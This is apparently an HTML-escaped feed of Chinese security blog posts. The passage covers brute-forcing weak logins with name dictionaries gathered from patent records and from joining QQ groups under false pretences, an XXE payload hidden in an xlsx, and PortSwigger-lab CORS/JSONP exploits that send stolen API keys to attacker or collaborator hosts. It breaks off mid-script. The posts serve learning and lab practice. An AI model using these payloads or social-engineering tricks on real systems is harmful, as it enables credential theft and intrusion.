class="line">爆破弱口令的时候经常需要目标公司的员工姓名组成字典，但员工姓名字典从哪来呢？</span><br><span class="line"></span><br><span class="line">大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做。但是对于千人及以下的中小型创业公司就不是很灵了。</span><br><span class="line"></span><br><span class="line">分享一种方法，适用于所有公司（尤其是科技公司），就是爬一下这个公司的专利信息列表。由于专利信息都是公开的，能找到大量人员真实姓名，而且多半是技术人员。</span><br><span class="line"></span><br><span class="line">企查查和天眼查都可以做这个事情。</span><br></pre></td></tr></table></figure><p>我们来实践一下这个技巧：打开天眼查，输入公司名称—&gt;进入公司主页—&gt;找到知识产权部分。即可看到很多知识产权信息，点击详情即可看到发明人姓名</p><p><img src="1.2.1.png" alt="1.2.1"></p><h5 id="社交软件："><a href="#社交软件：" class="headerlink" title="社交软件："></a>社交软件：</h5><p>社交软件，大佬都有很多骚操作，简单分享一下我知道的。</p><p>比如我们可以搜索qq群：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020级清华大学通知群</span><br><span class="line">某公司xx项目开发群</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>编造一下加群信息，进入群的瞬间打开文件，下载所有群文件….也许有意想不到的收获</p><p>具体操作没实践过…大佬们可在得到测试授权的情况下自行尝试。</p><h2 id="2-密码生成"><a href="#2-密码生成" class="headerlink" title="2.密码生成"></a>2.密码生成</h2><p>个人感觉，密码爆破时针对性的生成目标字典，再配合top500,top10000字典，可以大大提高成功率。</p><p>密码生成主要使用一些小工具，这里简单推荐一下用起来感觉不错的工具：</p><h3 id="2-1-pydictor"><a href="#2-1-pydictor" class="headerlink" title="2.1 pydictor"></a>2.1 <a href="https://github.com/LandGrey/pydictor">pydictor</a></h3><p>项目地址：<a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p><p>该工具有很多模块，其中社会工程学字典模块，可以根据用户信息针对性生成字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py --sedb</span><br></pre></td></tr></table></figure><p><img src="2.1.1.png" alt="2.1.1"></p><p>设置收集到的用户名，邮箱，生日等可以针对性的生成字典。</p><p>该工具还有字典合并去重，字典编码等多种功能，也可以单独 编写扩展插件。</p><h3 id="2-2-杂七杂八的小工具"><a href="#2-2-杂七杂八的小工具" class="headerlink" title="2.2 杂七杂八的小工具"></a>2.2 杂七杂八的小工具</h3><p>网上流通的各种小工具….可以试试，部分感觉还行。</p><p><img src="2.2.1.png" alt="2.2.1"></p><p>在线字典生成网站：</p><p><a href="https://www.bugku.com/mima/">https://www.bugku.com/mima/</a></p><p>大佬们有好用的社工库的话，根据收集的信息直接查，形成降维打击也是很好的选择，这个不多说。</p><h3 id="2-3-一些小尝试"><a href="#2-3-一些小尝试" class="headerlink" title="2.3 一些小尝试"></a>2.3 一些小尝试</h3><p>感觉密码爆破更多的还是看运气，更多的操作只是提高爆破成功的概率，反正多试试。</p><p>毕竟鲁迅先生曾经说过，人类所有的伟大都来源于试一试。</p><p>常用手段出不来，可以试试：</p><p>域名+5位数字，用户名+五位数字，admin+五位数字。</p><p>六位数字太费时间就不优先考虑了</p><h2 id="3-存在验证码"><a href="#3-存在验证码" class="headerlink" title="3.存在验证码"></a>3.存在验证码</h2><p>存在验证码，验证码过弱，或者存在绕过缺陷也是可以被爆破的</p><h3 id="3-1-验证码识别"><a href="#3-1-验证码识别" class="headerlink" title="3.1 验证码识别"></a>3.1 验证码识别</h3><h4 id="pkavhttpfuzzer"><a href="#pkavhttpfuzzer" class="headerlink" title="pkavhttpfuzzer"></a>pkavhttpfuzzer</h4><p>验证码识别可以使用pkavhttpfuzzer，该工具可以识别一些特别简单的验证码</p><p><img src="3.1.1.png" alt="3.1.1"></p><p>也可以使用burp插件：<a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p><h4 id="调用第三方的打码平台接口"><a href="#调用第三方的打码平台接口" class="headerlink" title="调用第三方的打码平台接口"></a>调用第三方的打码平台接口</h4><p>比如这里调用：<a href="http://www.ttshitu.com/">http://www.ttshitu.com/</a> 的识别接口，识别效果还是不错的。不过太贵了，一般渗透测试，不至于不至于…</p><p><img src="3.1.2.png" alt="3.1.2"></p><p>也可以自己开发训练验证码识别接口，这个没有深究过，大佬们可自行尝试</p><h3 id="3-2-验证码绕过"><a href="#3-2-验证码绕过" class="headerlink" title="3.2 验证码绕过"></a>3.2 验证码绕过</h3><p>验证码有时候存在缺陷可能导致被绕过</p><p>先知有大佬文章详细的说了验证码的绕过姿势，这里就不照搬了</p><p>放一下连接：</p><p>[红日安全]Web安全Day14 - 验证码实战攻防 :<a href="https://xz.aliyun.com/t/6971">https://xz.aliyun.com/t/6971</a></p><p>逻辑让我崩溃之验证码姿势分享 : <a href="https://xz.aliyun.com/t/4533">https://xz.aliyun.com/t/4533</a></p><h1 id="弱口令登陆后的xxe"><a href="#弱口令登陆后的xxe" class="headerlink" title="弱口令登陆后的xxe"></a>弱口令登陆后的xxe</h1><p>回到一开始的项目，弱口令登陆后台之后，第一步当然是找上传点，找到一个上传excel文件上传的。抓包进行任意文件上传测试，发现上传不会返回路径，只解析文件的内容并返回到页面上，估计服务器都没有保存上传的文件，任意文件上传不存在。</p><p>但是发现服务器对文件存在解析，而且还是xlsx文件，xlsx文件主要由xml文件构成，解析过程中可能会存在xxe漏洞</p><p>制作poc文件进行尝试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">更改test.xlsx文件后缀位test.zip</span><br><span class="line">unzip test.zip</span><br><span class="line"></span><br><span class="line">vim &#x27;[Content_Types].xml&#x27;</span><br><span class="line"></span><br><span class="line">添加paylaod:</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://mkazyh916th6c7sw7qmgbxv87zdp1e.burpcollaborator.net&quot;&gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="4.1.png" alt="4.1"></p><p>重新压缩回去：</p><p><code>zip -r test.xlsx  ./*</code></p><p>重新上传文件，发现接收到了服务器的请求，确定漏洞存在</p><p><img src="4.2.png" alt="4.2"></p><p><img src="4.4.png" alt="4.4"></p><p>这也算是第一次在实战中遇到文件上传的xxe (<em>^_^</em>)，推荐一道ctf题目练习：<br><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]filejava">https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]filejava</a></p><p>该项目还存在其他的问题，但碍于测试时间比较赶，自己也很菜就没有getshell…</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe实战，弱口令爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域漏洞那些事儿（cors,jsonp)</title>
      <link href="/2019/07/05/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%EF%BC%88cors,jsonp)/"/>
      <url>/2019/07/05/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%EF%BC%88cors,jsonp)/</url>
      
        <content type="html"><![CDATA[<p>本文首发于雷神众测：</p><p><a href="https://mp.weixin.qq.com/s/cHOvEbYtYNfl2lQ8-N3qtA">https://mp.weixin.qq.com/s/cHOvEbYtYNfl2lQ8-N3qtA</a></p><p>近期在src挖掘中经常看到大佬们提到cors,josnp一直不太理解此类漏洞。特此学习记录一下，如有错误之处还望师傅们斧正。</p><h2 id="1-跨域资源共享（cors"><a href="#1-跨域资源共享（cors" class="headerlink" title="1.跨域资源共享（cors)"></a>1.跨域资源共享（cors)</h2><h3 id="跨域资源共享-cors-原理："><a href="#跨域资源共享-cors-原理：" class="headerlink" title="跨域资源共享(cors)原理："></a>跨域资源共享(cors)原理：</h3><p>在讲cors之前我们先来了解一下同源策略（sop）。</p><h5 id="1-1-同源策略"><a href="#1-1-同源策略" class="headerlink" title="1.1 同源策略"></a>1.1 同源策略</h5><p><strong>浏览器的安全基石是同源策略。同源策略保证了同一个浏览器打开不同网站，不同网站之间不会相互影响。</strong></p><p>列如：张三登陆了某银行网站，浏览器存储了他的cookie。而这时他又打开了另一个小网站，该小网站会记录用户的cookie。如果没有同源策略，他就会记录浏览器存储的cookie，此时银行网站的cookie也被记录，从而造成银行用户cookie泄露。</p><p>同源策略中的同源是指：</p><p>三个同源：<strong>同协议，同域名，同端口</strong> ，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:www.test.com 和 http:www.test.com (不同源，协议不同)</span><br><span class="line">http:www.test.com  和 http:login.test.com (不同源，域名不同)</span><br><span class="line">http:www.test.com:80 和 http:www.test.com:8080 (不同源，端口不同)</span><br></pre></td></tr></table></figure><h5 id="1-2-同源策略-sop-的窗口跨域资源共享-cors"><a href="#1-2-同源策略-sop-的窗口跨域资源共享-cors" class="headerlink" title="1.2 同源策略(sop)的窗口跨域资源共享(cors)"></a>1.2 同源策略(sop)的<strong>窗口</strong>跨域资源共享(cors)</h5><p>但是安全和方便总是难两全。张三新开发了一个网站A，要从网站B上获取数据，但是因为同源策略的存在他获取不了B网站上的数据。此时他通过搜索发现一个叫做跨域资源共享的东西经过一通配置，他成功获取到了B网站的数据：</p><p>他的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>这个配置在满足要求的同时也造成了严重的安全问题，*<em>Access-Control-Allow-Origin: * ** 通配符</em>允许A网站访问的同时也允许了其他任意网站的访问。假设一个攻击过程：</p><p>网站C的cors配置存在缺陷，被一个黑客发现，该黑客通过友链申请，给站长发送了一个网站链接，站长为了确认友链网站，打开了网站链接，而该网站中部署了黑客精心构造的恶意脚本，能够自动获取存储网站C中的cookie信息，此时黑客就获取到了站长的cookie信息…</p><p><strong>配置讲解：</strong></p><p><strong>Access-Control-Allow-Origin：</strong>*<br>web浏览器将Access-Control-Allow-Origin与请求网站的来源进行比较，如果匹配则允许访问响应</p><p>例如：Access-Control-Allow-Origin：<a href="http://www.test.com/">http://www.test.com</a></p><p>此时网站login.test.com（小A)向<a href="http://www.test.com/">www.test.com</a>(小B）发起 请求，小B一看请求源（origin）和自己的配置不一样，知道小A可能是个坏蛋，照例将请求返回给小A，但是响应中不含有Access-Control-Allow-Origin标头，万能的浏览器一看跨域请求，响应中还没有Access-Control-Allow-Origin字段，立马报错。坏蛋小A就获取不到小B的数据了…</p><p>更多详细讲解可参考阮老师文章：<a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><p><strong>Access-Control-Allow-Credentials: true</strong><br>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。</p><p>设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送Cookie，删除该字段即可。</p><p><strong>通过前面的介绍我们对cors也知名知意了，这时问题就出现了，这漏洞该怎么挖呢？</strong></p><p>这时就要了解一下burpsuite网站的实验室，该实验室中存在多中漏洞实验，在学习漏洞知识的同时也能实战学习漏洞利用技巧，接下来就简单记录一下实验过程。</p><p>实验链接：<a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p><h4 id="实战练习："><a href="#实战练习：" class="headerlink" title="实战练习："></a>实战练习：</h4><h5 id="1-1-来源（origin-可任意更改的cors漏洞"><a href="#1-1-来源（origin-可任意更改的cors漏洞" class="headerlink" title="1.1 来源（origin)可任意更改的cors漏洞"></a>1.1 来源（origin)可任意更改的cors漏洞</h5><p><img src="1.1.1.png" alt="1.1.1"></p><p>该实验个人账户界面存在账户的api密钥，我们的目标就是获取到用户的api密钥</p><p><img src="1.1.2.png" alt="1.1.2"></p><p>通过观察网站源码，发现api密码是通过一个ajax接口返回到页面的。<strong>直接访问接口，并将请求来源跟改为任意网站可以获取到密钥，说明存在cors漏洞</strong></p><p><img src="1.1.3.png" alt="1.1.3"></p><p>此时我们有一个攻击思路：</p><p>部署一个恶意脚本到我们的网站上，并将该网址链接发送给要攻击的小王，小王只要访问了我们的链接，我们即可在web日志中获取到小王的api密钥</p><p>恶意脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">   req.onload = reqListener;</span><br><span class="line"><span class="comment">// 打开api密钥链接</span></span><br><span class="line">   req.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://ac0c1f2b1efc321180e1a18c007100d3.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 设置为true可以保证，请求的时候携带cookie</span></span><br><span class="line">   req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">   req.send();</span><br><span class="line"></span><br><span class="line"><span class="comment">//将访问api密钥得到的数据，拼接到url中访问自己服务，即可在服务器web日志中找到api密钥信息</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    location=<span class="string">&#x27;/log?key=&#x27;</span>+<span class="built_in">this</span>.responseText;</span><br><span class="line">   &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>获取到的密钥：</p><p><img src="1.1.4.png" alt="1.1.4"></p><h5 id="1-2-来源（origin-可为null的cors漏洞"><a href="#1-2-来源（origin-可为null的cors漏洞" class="headerlink" title="1.2 来源（origin) 可为null的cors漏洞"></a>1.2 来源（origin) 可为null的cors漏洞</h5><p>在某些应用程序中可能会将null列入白名单，以支持本地应用程序的开发。</p><p>origin标头不可以设置为任意标头了，尝试设置为null，此时可以获取到数据，说明存在请求来源可为null的cors漏洞</p><p><img src="1.2.1.png" alt="1.2.1"></p><p>本地html测试：</p><p>测试exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="string">&quot;data:text/html,&lt;script&gt;</span></span><br><span class="line"><span class="string">var req = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">req.onload = reqListener;</span></span><br><span class="line"><span class="string">req.open(&#x27;get&#x27;,&#x27;https://ac8d1f4c1ebc2af2806b9d9d00df0041.web-security-academy.net/accountDetails&#x27;,true);</span></span><br><span class="line"><span class="string">req.withCredentials = true;</span></span><br><span class="line"><span class="string">req.send();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">console.log(this.responseText);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="1.2.2.png" alt="1.2.1"></p><p>此时我们继续采用实验一的攻击思路：</p><p>部署一个恶意脚本到我们的网站上，并将该网址链接发送给要攻击的小王，小王只要访问了我们的链接，我们即可获取到小王的api密钥</p><p>编写exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="string">&quot;data:text/html,&lt;script&gt;</span></span><br><span class="line"><span class="string">var req = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">req.onload = reqListener;</span></span><br><span class="line"><span class="string">req.open(&#x27;get&#x27;,&#x27;https://ac8d1f4c1ebc2af2806b9d9d00df0041.web-security-academy.net/accountDetails&#x27;,true);</span></span><br><span class="line"><span class="string">req.withCredentials = true;</span></span><br><span class="line"><span class="string">req.send();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function reqListener() &#123;</span></span><br><span class="line"><span class="string">    //恶意网站</span></span><br><span class="line"><span class="string">location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h5 id="1-3-利用信任子域的xss获取主域的敏感信息"><a href="#1-3-利用信任子域的xss获取主域的敏感信息" class="headerlink" title="1.3 利用信任子域的xss获取主域的敏感信息"></a>1.3 利用信任子域的xss获取主域的敏感信息</h5><p>有些服务器的配置为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//*.test.com</span></span><br></pre></td></tr></table></figure><p>这个配置乍一看没问题，信任自己的子域不是很正常吗，但是子域成百上千的大网站中，子域就特别容易出问题，找个xss既有可能严重威胁到主站。而且该配置也不符合最小信任原则，通配符<em>不能随便用，应该设置为固定值。例如：</em></p><p><code>Access-Control-Allow-Origin: http://login.test.com</code> 此时只要保证login.test.com没问题即可确保主站不会遭受cors攻击</p><p>在该实验三中将来源（origin)设置为任意子域，如：</p><p><img src="1.3.1.png" alt="1.3.1"></p><p>设置为不存在的example子域，依旧可以访问敏感数据</p><p>正好该网站的检查库存会将单价信息返回到子域，并且productId参数存在xss漏洞</p><p><img src="1.3.2.png" alt="1.3.2"></p><p>所以想到一个利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">子域触发xss---&gt;访问主域敏感信息---&gt;将敏感信息保存到任意网站</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="built_in">document</span>.location=<span class="string">&quot;http://stock.ac671f961e9e127a8052d5200051006e.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://ac671f961e9e127a8052d5200051006e.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://ac021ff51e53121f804ed5d3013300da.web-security-academy.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>exp解释：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">//子域触发xss，xss访问主域敏感信息</span></span><br><span class="line">   <span class="built_in">document</span>.location=<span class="string">&quot;http://stock.ac671f961e9e127a8052d5200051006e.web-security-academy.net/</span></span><br><span class="line"><span class="string">   ?productId=4</span></span><br><span class="line"><span class="string">   //采用原生js http请求将获取到的内容，保存到主机</span></span><br><span class="line"><span class="string">   &lt;script&gt;var req = new XMLHttpRequest(); </span></span><br><span class="line"><span class="string">   req.onload = reqListener; </span></span><br><span class="line"><span class="string">   //访问敏感信息</span></span><br><span class="line"><span class="string">   req.open(&#x27;get&#x27;,&#x27;https://ac671f961e9e127a8052d5200051006e.web-security-academy.net/accountDetails&#x27;,true); </span></span><br><span class="line"><span class="string">   req.withCredentials = true;</span></span><br><span class="line"><span class="string">   req.send();</span></span><br><span class="line"><span class="string">function reqListener() &#123;</span></span><br><span class="line"><span class="string">       //携带敏感信息，get请求访问主机，主机log日志即可出现用户apikey</span></span><br><span class="line"><span class="string">   location=&#x27;https://ac021ff51e53121f804ed5d3013300da.web-security-academy.net/log?key=&#x27;%2bthis.responseText; &#125;;</span></span><br><span class="line"><span class="string">   %3c/script&gt;</span></span><br><span class="line"><span class="string">   &amp;storeId=1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>跨域除了cors外还有一种非官方的方法jsonp，jsonp 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。</strong></p><p>jsonp通过动态创建<script>标签，然后利用<script>的src属性不受同源策略的约束来获取跨域数据。</p><p>jsonp在造成方便的同时也造成了一定的安全的问题。jsonp劫持最早在08年提出，早期各大厂商并不重视此类漏洞，但在个人信息保护严密的现在，jsonp劫持带来的信息泄露问题，促使各大src厂商开始重视jsonp劫持漏洞。以下简要分析jsonp劫持原理，很多不足之处，还望大佬们斧正。</p><h2 id="2-jsonp劫持"><a href="#2-jsonp劫持" class="headerlink" title="2.jsonp劫持"></a>2.jsonp劫持</h2><h3 id="2-1-漏洞场景模拟："><a href="#2-1-漏洞场景模拟：" class="headerlink" title="2.1 漏洞场景模拟："></a>2.1 漏洞场景模拟：</h3><p>某司因为业务需求，需要网站B从网站A中获取json数据，所以他们在A中实现了一个jsonp接口</p><p><img src="2.1.1.png" alt="2.1.1"></p><p>接口代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsonpCallback</span> = htmlspecialchars(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsonp&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;张三&quot;,&quot;12011012110&quot;,&quot;男&quot;,&quot;浙江杭州&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsonpCallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网站B代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">result, methodName</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.length; i++)</span></span><br><span class="line"><span class="javascript">    &#123;</span></span><br><span class="line"><span class="javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;divCustomers&#x27;</span>).innerHTML = html;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/jsonp.php?jsonp=callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="2.1.2.png" alt="2.1.2"></p><p>此时通过jsonp接口，实现了跨域传输。然而该跨域传输过程存在很大的安全安全问题，因为对json参数调用者没有任何限制</p><h3 id="2-2-漏洞利用流程："><a href="#2-2-漏洞利用流程：" class="headerlink" title="2.2 漏洞利用流程："></a>2.2 漏洞利用流程：</h3><p>这里使用burp的collaborator client功能来接收http记录，主要是为了实验，也演示一下collaborator client的强大功能 ，在实际利用中可以直接向本地127.0.01发送请求，在web日志记录中查看即可</p><p>2.2.1 打开collaborator client获取请求链接</p><p><img src="2.1.3.png" alt="2.1.3"></p><p><img src="2.1.4.png" alt="2.1.4"></p><p>2.2.2 复制链接填入脚本，点击Poll now开始循环监听http请求。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;jsonp exp&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">result</span>)</span></span></span></span><br><span class="line"><span class="function"><span class="javascript"><span class="xml"></span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">   <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="comment">//向burp的collaborator client发送请求，并携带获取到json数据</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">   req.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://r2u9atjp588pt96t5cpef5o40v6lua.burpcollaborator.net/?userinfo=&#x27;</span>+result,<span class="literal">true</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">   req.withCredentials = <span 